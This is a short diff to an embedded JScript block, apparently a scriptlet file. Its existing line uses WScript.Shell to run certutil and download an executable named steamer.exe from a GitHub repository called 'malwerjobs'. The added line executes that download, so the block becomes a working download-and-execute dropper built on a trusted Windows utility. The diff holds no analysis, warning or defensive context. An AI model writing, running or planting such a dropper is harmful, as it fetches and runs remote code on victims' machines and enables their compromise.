@@ -10,6 +10,7 @@
 <![CDATA[
 	function Exec()	{
 		var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f https://raw.githubusercontent.com/SteAmeR/malwerjobs/master/steamer.exe steamer.exe");
+		var x = new ActiveXObject("WScript.Shell").Run("steamer.exe");
 	}
 ]]>
 </script>
